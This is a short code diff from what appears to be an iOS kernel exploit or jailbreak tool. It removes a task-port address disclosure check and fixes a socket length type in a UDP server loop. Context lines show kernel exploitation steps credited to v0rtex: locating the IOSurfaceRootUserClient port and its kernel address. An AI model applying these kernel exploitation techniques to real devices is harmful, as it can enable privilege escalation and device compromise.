@@ -83,15 +83,6 @@ int runserver(){
 
     user_client = prepare_user_client();
 
-    uint64_t cached_task_self_addr = 0;
-    uint64_t task_self = task_self_addr();
-    if (task_self == 0) {
-        NSLog(@"unable to disclose address of our task port");
-        sleep(10);
-        exit(EXIT_FAILURE);
-    }
-    NSLog(@"our task port is at 0x%llx", task_self);
-
     // From v0rtex - get the IOSurfaceRootUserClient port, and then the address of the actual client, and vtable
     uint64_t IOSurfaceRootUserClient_port = find_port(user_client); // UserClients are just mach_ports, so we find its address
     NSLog(@"Found port: 0x%llx", IOSurfaceRootUserClient_port);
@@ -175,7 +166,7 @@ int runserver(){
 
     char buf[1024];
 
-    int clientlen = sizeof(clientaddr);
+    socklen_t clientlen = sizeof(clientaddr);
     while (1){
         bzero(buf, 1024);
         int size = recvfrom(sockfd, buf, 1024, 0, (struct sockaddr *)&clientaddr, &clientlen);
